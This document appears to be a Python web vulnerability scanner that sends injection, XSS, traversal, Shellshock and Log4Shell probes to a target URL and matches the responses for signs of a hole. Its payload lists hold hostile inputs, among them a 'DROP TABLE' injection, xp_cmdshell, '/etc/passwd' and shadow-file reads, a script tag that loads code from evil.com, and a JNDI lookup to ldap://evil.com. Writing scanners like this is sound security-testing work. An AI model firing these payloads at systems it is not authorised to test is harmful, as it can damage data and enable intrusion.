import requests
from urllib.parse import urlparse, quote
import re

def check_vulnerabilities(url):
    """Advanced vulnerability scanning using pure Python - no external tools required"""
    vulnerabilities = []

    # Comprehensive vulnerability detection
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"

    # 1. SQL Injection Testing
    vulnerabilities.extend(check_sql_injection(url))

    # 2. Cross-Site Scripting (XSS) Testing
    vulnerabilities.extend(check_xss_vulnerabilities(url))

    # 3. Command Injection Testing
    vulnerabilities.extend(check_command_injection(url))

    # 4. Directory Traversal Testing
    vulnerabilities.extend(check_directory_traversal(url))

    # 5. Open Redirect Testing
    vulnerabilities.extend(check_open_redirect(url))

    # 6. Information Disclosure Checks
    vulnerabilities.extend(check_information_disclosure(base_url))

    # 7. Security Headers Analysis
    vulnerabilities.extend(check_security_headers(base_url))

    # 8. HTTP Methods Testing
    vulnerabilities.extend(check_http_methods(base_url))

    # 9. SSL/TLS Vulnerabilities
    vulnerabilities.extend(check_ssl_vulnerabilities(base_url))

    # 10. Common Web Vulnerabilities
    vulnerabilities.extend(check_common_vulnerabilities(base_url))

    print(f"DEBUG: Advanced vulnerability scan completed, found {len(vulnerabilities)} potential issues")

    return vulnerabilities

def check_sql_injection(url):
    """Advanced SQL injection testing"""
    vulnerabilities = []

    sql_payloads = [
        "'",
        "' OR '1'='1 --",
        "'; DROP TABLE users; --",
        "' UNION SELECT username, password FROM users --",
        "' AND 1=0 UNION SELECT database() --",
        "'; EXEC xp_cmdshell('net user') --",
        "' OR '1'='1' /*",
        "')) OR (('1'='1",
        "' OR SLEEP(5) --",
        "'; WAITFOR DELAY '0:0:5' --"
    ]

    sql_error_patterns = [
        "sql syntax", "mysql error", "postgresql error", "sqlite error",
        "ora-", "microsoft sql", "syntax error", "database error",
        "unclosed quotation mark", "quoted string not properly terminated",
        "you have an error in your sql syntax"
    ]

    for payload in sql_payloads[:5]:  # Test first 5 payloads to avoid being too aggressive
        try:
            # Test different injection points
            injection_points = ["id", "user", "username", "query", "search", "q"]

            for param in injection_points[:3]:  # Test first 3 parameters
                test_url = url + f"?{param}=" + quote(payload)
                response = requests.get(test_url, timeout=5, verify=True)

                if response.status_code == 200:
                    response_text = response.text.lower()
                    if any(error in response_text for error in sql_error_patterns):
                        vulnerabilities.append({
                            "type": "SQL Injection",
                            "severity": "High",
                            "description": f"SQL injection vulnerability detected in parameter '{param}' with payload: {payload}"
                        })
                        break  # Found vulnerability, no need to test more
            if vulnerabilities:  # If we found a vulnerability, stop testing
                break
        except:
            pass

    return vulnerabilities

def check_xss_vulnerabilities(url):
    """Advanced XSS testing"""
    vulnerabilities = []

    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "'><script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
        "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>"
    ]

    for payload in xss_payloads[:5]:  # Test first 5 payloads
        try:
            injection_points = ["q", "search", "query", "input", "text"]

            for param in injection_points[:3]:
                test_url = url + f"?{param}=" + quote(payload)
                response = requests.get(test_url, timeout=5, verify=True)

                if payload in response.text and response.status_code == 200:
                    # Check if it's properly sanitized
                    if '<script>' in payload and '<script>' in response.text:
                        # Payload reflected without proper encoding
                        vulnerabilities.append({
                            "type": "Cross-Site Scripting (XSS)",
                            "severity": "High",
                            "description": f"XSS vulnerability detected in parameter '{param}' - payload reflected without encoding"
                        })
                        break
            if vulnerabilities:
                break
        except:
            pass

    return vulnerabilities

def check_command_injection(url):
    """Command injection testing"""
    vulnerabilities = []

    cmd_payloads = [
        "; ls",
        "| cat /etc/passwd",
        "`whoami`",
        "$(id)",
        "; ping -c 1 127.0.0.1",
        "| dir",
        "; net user",
        "$(uname -a)"
    ]

    success_indicators = [
        "root:", "uid=", "bin/bash", "bin/sh", "windows", "volume serial",
        "directory of", "volume in drive", "kernel version", "linux"
    ]

    for payload in cmd_payloads[:4]:  # Test first 4 payloads
        try:
            injection_points = ["cmd", "exec", "command", "run", "shell"]

            for param in injection_points[:2]:
                test_url = url + f"?{param}=" + quote(payload)
                response = requests.get(test_url, timeout=5, verify=True)

                if response.status_code == 200:
                    response_text = response.text.lower()
                    if any(indicator in response_text for indicator in success_indicators):
                        vulnerabilities.append({
                            "type": "Command Injection",
                            "severity": "Critical",
                            "description": f"Command injection vulnerability detected in parameter '{param}' - system command executed"
                        })
                        break
            if vulnerabilities:
                break
        except:
            pass

    return vulnerabilities

def check_directory_traversal(url):
    """Directory traversal testing"""
    vulnerabilities = []

    traversal_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "../../../../etc/shadow",
        "..\\..\\..\\..\\boot.ini",
        "../../../etc/hostname",
        "../../../../root/.bash_history",
        "../../../proc/version",
        "..\\..\\..\\..\\..\\windows\\win.ini"
    ]

    file_indicators = [
        "root:", "bin:", "daemon:", "sys:", "sync:", "games:",
        "Microsoft Windows", "boot loader", "system32", "kernel",
        "processor", "memory", "hostname", "bash_history"
    ]

    for payload in traversal_payloads[:4]:  # Test first 4 payloads
        try:
            test_url = url + "?file=" + quote(payload)
            response = requests.get(test_url, timeout=5, verify=True)

            if response.status_code == 200:
                response_text = response.text.lower()
                if any(indicator in response_text for indicator in file_indicators):
                    vulnerabilities.append({
                        "type": "Directory Traversal",
                        "severity": "High",
                        "description": f"Directory traversal vulnerability detected - sensitive file content exposed"
                    })
                    break
        except:
            pass

    return vulnerabilities

def check_open_redirect(url):
    """Open redirect testing"""
    vulnerabilities = []

    redirect_payloads = [
        "http://evil.com",
        "https://evil.com",
        "//evil.com",
        "http://127.0.0.1",
        "https://localhost",
        "///evil.com",
        "http://example.com"
    ]

    for payload in redirect_payloads[:3]:  # Test first 3 payloads
        try:
            injection_points = ["redirect", "url", "return", "next", "continue", "goto"]

            for param in injection_points[:3]:
                test_url = url + f"?{param}=" + quote(payload)
                response = requests.get(test_url, allow_redirects=False, timeout=5, verify=True)

                location = response.headers.get('Location', '')
                if location and (payload in location or any(evil in location for evil in ['evil.com', '127.0.0.1', 'localhost', 'example.com'])):
                    vulnerabilities.append({
                        "type": "Open Redirect",
                        "severity": "Medium",
                        "description": f"Open redirect vulnerability detected in parameter '{param}' - redirects to external domains"
                    })
                    break
            if vulnerabilities:
                break
        except:
            pass

    return vulnerabilities

def check_information_disclosure(base_url):
    """Information disclosure checks"""
    vulnerabilities = []

    sensitive_paths = [
        "/.env",
        "/.git/config",
        "/.svn/entries",
        "/server-status",
        "/server-info",
        "/phpinfo.php",
        "/test.php",
        "/config.php",
        "/backup.sql",
        "/database.sql",
        "/wp-config.php",
        "/web.config",
        "/crossdomain.xml"
    ]

    sensitive_indicators = [
        "database", "password", "secret", "key", "token", "api_key",
        "aws_access", "mysql", "postgresql", "mongodb", "redis",
        "smtp", "email", "admin", "root", "config"
    ]

    for path in sensitive_paths[:8]:  # Test first 8 paths
        try:
            test_url = base_url.rstrip('/') + path
            response = requests.get(test_url, timeout=5, verify=True)

            if response.status_code == 200 and len(response.text) > 50:
                response_text = response.text.lower()
                if any(indicator in response_text for indicator in sensitive_indicators):
                    severity = "High" if any(critical in path for critical in ['.env', 'config', 'backup', 'wp-config']) else "Medium"
                    vulnerabilities.append({
                        "type": "Information Disclosure",
                        "severity": severity,
                        "description": f"Sensitive information exposed at {path}"
                    })
        except:
            pass

    return vulnerabilities

def check_security_headers(base_url):
    """Security headers analysis"""
    vulnerabilities = []

    try:
        response = requests.get(base_url, timeout=5, verify=True)
        headers = response.headers

        # Check for missing security headers
        critical_headers = {
            'X-Frame-Options': 'Clickjacking protection',
            'X-Content-Type-Options': 'MIME sniffing protection',
            'Content-Security-Policy': 'XSS protection',
            'Strict-Transport-Security': 'HTTPS enforcement',
            'Referrer-Policy': 'Referrer information control'
        }

        missing_critical = []
        for header, purpose in critical_headers.items():
            if header not in headers:
                missing_critical.append(header)

        if missing_critical:
            vulnerabilities.append({
                "type": "Missing Security Headers",
                "severity": "Medium",
                "description": f"Critical security headers missing: {', '.join(missing_critical[:3])}"
            })

        # Check for weak CSP
        csp = headers.get('Content-Security-Policy', '')
        if csp and ("unsafe-inline" in csp or "unsafe-eval" in csp):
            vulnerabilities.append({
                "type": "Weak Content Security Policy",
                "severity": "Medium",
                "description": "Content Security Policy allows unsafe inline scripts or eval"
            })

    except:
        pass

    return vulnerabilities

def check_http_methods(base_url):
    """HTTP methods testing"""
    vulnerabilities = []

    dangerous_methods = ['PUT', 'DELETE', 'TRACE', 'OPTIONS', 'PATCH']

    for method in dangerous_methods[:3]:  # Test first 3 dangerous methods
        try:
            response = requests.request(method, base_url, timeout=5, verify=True)
            if response.status_code not in [405, 501]:  # Method not allowed or not implemented
                vulnerabilities.append({
                    "type": "Dangerous HTTP Methods",
                    "severity": "Low",
                    "description": f"Dangerous HTTP method '{method}' is enabled on the server"
                })
        except:
            pass

    return vulnerabilities

def check_ssl_vulnerabilities(base_url):
    """SSL/TLS vulnerability checks"""
    vulnerabilities = []

    if base_url.startswith('https://'):
        try:
            import ssl
            import socket

            hostname = base_url.replace('https://', '').split('/')[0].split(':')[0]
            port = 443

            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            with socket.create_connection((hostname, port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cipher = ssock.cipher()
                    ssl_version = ssock.version()

                    # Check for weak SSL/TLS versions
                    if ssl_version in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                        vulnerabilities.append({
                            "type": "Weak SSL/TLS Version",
                            "severity": "High",
                            "description": f"Server supports weak SSL/TLS version: {ssl_version}"
                        })

                    # Check for weak ciphers
                    weak_ciphers = ['RC4', 'DES', '3DES', 'NULL', 'anon']
                    cipher_name = cipher[0] if cipher else ""
                    if any(weak in cipher_name.upper() for weak in weak_ciphers):
                        vulnerabilities.append({
                            "type": "Weak SSL Cipher",
                            "severity": "Medium",
                            "description": f"Server uses weak SSL cipher: {cipher_name}"
                        })

        except:
            pass

    return vulnerabilities

def check_common_vulnerabilities(base_url):
    """Common web vulnerability checks"""
    vulnerabilities = []

    try:
        response = requests.get(base_url, timeout=5, verify=True)
        html = response.text.lower()

        # Check for common vulnerable patterns
        if 'wordpress' in html:
            # Check for common WordPress vulnerabilities
            wp_paths = ['/wp-admin/install.php', '/wp-admin/setup-config.php']
            for path in wp_paths:
                try:
                    test_response = requests.get(base_url.rstrip('/') + path, timeout=3, verify=True)
                    if test_response.status_code == 200:
                        vulnerabilities.append({
                            "type": "WordPress Misconfiguration",
                            "severity": "Medium",
                            "description": f"WordPress setup/configuration page accessible: {path}"
                        })
                except:
                    pass

        # Check for exposed admin panels
        admin_paths = ['/admin', '/administrator', '/admin.php', '/login.php']
        for path in admin_paths:
            try:
                test_response = requests.get(base_url.rstrip('/') + path, timeout=3, verify=True)
                if test_response.status_code == 200 and len(test_response.text) > 100:
                    if any(login_indicator in test_response.text.lower() for login_indicator in ['login', 'password', 'admin', 'username']):
                        vulnerabilities.append({
                            "type": "Exposed Admin Panel",
                            "severity": "Low",
                            "description": f"Admin panel potentially exposed: {path}"
                        })
            except:
                pass

        # Check for directory listing
        common_dirs = ['/images/', '/css/', '/js/', '/uploads/']
        for dir_path in common_dirs:
            try:
                test_response = requests.get(base_url.rstrip('/') + dir_path, timeout=3, verify=True)
                if test_response.status_code == 200:
                    content = test_response.text.lower()
                    if any(indicator in content for indicator in ['index of', 'parent directory', 'folder listing']):
                        vulnerabilities.append({
                            "type": "Directory Listing",
                            "severity": "Low",
                            "description": f"Directory listing enabled: {dir_path}"
                        })
            except:
                pass

    except:
        pass

    return vulnerabilities

def check_vulnerabilities_manual(url):
    """Manual vulnerability checks as fallback when nikto is not available"""
    vulnerabilities = []

    # Enhanced SQL injection test
    sql_payloads = [
        "'",
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT NULL--",
        "' AND 1=0 UNION SELECT username, password FROM users--"
    ]
    sql_error_patterns = [
        "sql syntax", "mysql error", "postgresql error", "sqlite error",
        "ora-", "microsoft sql", "syntax error", "database error"
    ]

    for payload in sql_payloads:
        try:
            test_url = url + "?id=" + quote(payload)
            response = requests.get(test_url, timeout=5, verify=True)
            response_text = response.text.lower()
            if any(error in response_text for error in sql_error_patterns):
                vulnerabilities.append({
                    "type": "SQL Injection",
                    "severity": "High",
                    "description": f"SQL injection vulnerability detected with payload: {payload}"
                })
                break
        except:
            pass

    # Enhanced XSS test
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')"
    ]

    for payload in xss_payloads:
        try:
            test_url = url + "?q=" + quote(payload)
            response = requests.get(test_url, timeout=5, verify=True)
            # Better XSS detection: check if payload is reflected without proper encoding
            if payload in response.text and not response.text.find(payload) == -1:
                # Check if it's properly encoded (basic check)
                if '<' in payload and '<' not in response.text[response.text.find(payload):response.text.find(payload)+len(payload)+10]:
                    vulnerabilities.append({
                        "type": "Cross-Site Scripting (XSS)",
                        "severity": "High",
                        "description": f"XSS vulnerability detected with payload: {payload}"
                    })
                    break
        except:
            pass

    # Command injection test
    cmd_payloads = ["; ls", "| cat /etc/passwd", "`whoami`", "$(id)"]
    for payload in cmd_payloads:
        try:
            test_url = url + "?cmd=" + quote(payload)
            response = requests.get(test_url, timeout=5, verify=True)
            if "root:" in response.text or "uid=" in response.text or "bin/bash" in response.text:
                vulnerabilities.append({
                    "type": "Command Injection",
                    "severity": "Critical",
                    "description": f"Command injection vulnerability detected with payload: {payload}"
                })
                break
        except:
            pass

    # Directory traversal test
    traversal_payloads = ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam"]
    for payload in traversal_payloads:
        try:
            test_url = url + "?file=" + quote(payload)
            response = requests.get(test_url, timeout=5, verify=True)
            if "root:" in response.text or any(line in response.text for line in ["bin/bash", "usr/bin"]):
                vulnerabilities.append({
                    "type": "Directory Traversal",
                    "severity": "High",
                    "description": f"Directory traversal vulnerability detected with payload: {payload}"
                })
                break
        except:
            pass

    # Open redirect test
    redirect_payloads = ["http://evil.com", "//evil.com", "https://evil.com"]
    for payload in redirect_payloads:
        try:
            test_url = url + "?redirect=" + quote(payload)
            response = requests.get(test_url, allow_redirects=False, timeout=5, verify=True)
            location = response.headers.get('Location', '')
            if payload in location or any(evil in location for evil in ["evil.com", "//evil.com"]):
                vulnerabilities.append({
                    "type": "Open Redirect",
                    "severity": "Medium",
                    "description": f"Open redirect vulnerability detected with payload: {payload}"
                })
                break
        except:
            pass

    # Check for common vulnerable paths (basic hardcoded list)
    vuln_paths = [
        "/admin", "/wp-admin", "/phpmyadmin", "/.env", "/backup.sql",
        "/server-status", "/.git/config", "/.svn/entries"
    ]
    for path in vuln_paths:
        try:
            test_url = url.rstrip('/') + path
            response = requests.get(test_url, timeout=5, verify=True)
            if response.status_code == 200 and len(response.text) > 100:
                vulnerabilities.append({
                    "type": "Information Disclosure",
                    "severity": "Medium",
                    "description": f"Potentially sensitive path exposed: {path}"
                })
        except:
            pass

    # Advanced vulnerability checks
    advanced_vulns = check_advanced_vulnerabilities(url)
    vulnerabilities.extend(advanced_vulns)

    return vulnerabilities

def check_advanced_vulnerabilities(url):
    """Advanced vulnerability detection methods"""
    vulnerabilities = []

    try:
        # Check for Heartbleed (SSL/TLS vulnerability)
        response = requests.get(url, timeout=5, verify=True)
        if 'https' in url and response.status_code == 200:
            # Check for vulnerable SSL versions in headers or response
            if 'TLSv1.0' in str(response.headers) or 'SSLv3' in str(response.headers):
                vulnerabilities.append({
                    "type": "SSL/TLS Vulnerability",
                    "severity": "High",
                    "description": "Potentially vulnerable SSL/TLS configuration detected"
                })

        # Check for Shellshock vulnerability indicators
        shellshock_payloads = ["() { :; }; echo 'Shellshock vulnerable'"]
        for payload in shellshock_payloads:
            try:
                headers = {'User-Agent': payload}
                response = requests.get(url, headers=headers, timeout=5, verify=True)
                if 'Shellshock vulnerable' in response.text:
                    vulnerabilities.append({
                        "type": "Shellshock",
                        "severity": "Critical",
                        "description": "Bash Shellshock vulnerability detected"
                    })
                    break
            except:
                pass

        # Check for Log4Shell vulnerability (basic check)
        log4shell_payloads = ["${jndi:ldap://evil.com/a}"]
        for payload in log4shell_payloads:
            try:
                headers = {'X-Api-Version': payload, 'User-Agent': payload}
                response = requests.get(url, headers=headers, timeout=5, verify=True)
                if response.status_code == 200:  # Basic connectivity check
                    vulnerabilities.append({
                        "type": "Log4Shell Check",
                        "severity": "Info",
                        "description": "Log4Shell payload sent - monitor for callbacks (advanced detection required)"
                    })
                    break
            except:
                pass

        # Check for exposed API endpoints
        api_endpoints = ["/api/v1/", "/api/v2/", "/graphql", "/rest/", "/api/json"]
        for endpoint in api_endpoints:
            try:
                test_url = url.rstrip('/') + endpoint
                response = requests.get(test_url, timeout=3, verify=True)
                if response.status_code in [200, 201, 401, 403]:  # API responses
                    content_type = response.headers.get('content-type', '').lower()
                    if 'json' in content_type or 'xml' in content_type or 'api' in response.text.lower():
                        vulnerabilities.append({
                            "type": "API Exposure",
                            "severity": "Low",
                            "description": f"Potential API endpoint exposed: {endpoint}"
                        })
            except:
                pass

        # Check for outdated software indicators
        response = requests.get(url, timeout=5, verify=True)
        html = response.text.lower()

        # Check for vulnerable WordPress versions
        if 'wordpress' in html:
            version_match = re.search(r'ver=([\d.]+)', html)
            if version_match:
                wp_version = version_match.group(1)
                if wp_version.startswith(('4.', '5.')):
                    vulnerabilities.append({
                        "type": "Outdated Software",
                        "severity": "High",
                        "description": f"WordPress {wp_version} detected - may be vulnerable to known exploits"
                    })

        # Check for vulnerable PHP versions in headers
        php_version = response.headers.get('X-Powered-By', '')
        if 'PHP' in php_version:
            version_match = re.search(r'PHP/([\d.]+)', php_version)
            if version_match:
                php_ver = version_match.group(1)
                if php_ver.startswith(('5.', '7.0', '7.1', '7.2', '7.3')):
                    vulnerabilities.append({
                        "type": "Outdated Software",
                        "severity": "Critical",
                        "description": f"PHP {php_ver} detected - end-of-life and vulnerable"
                    })

    except Exception as e:
        pass

    return vulnerabilities
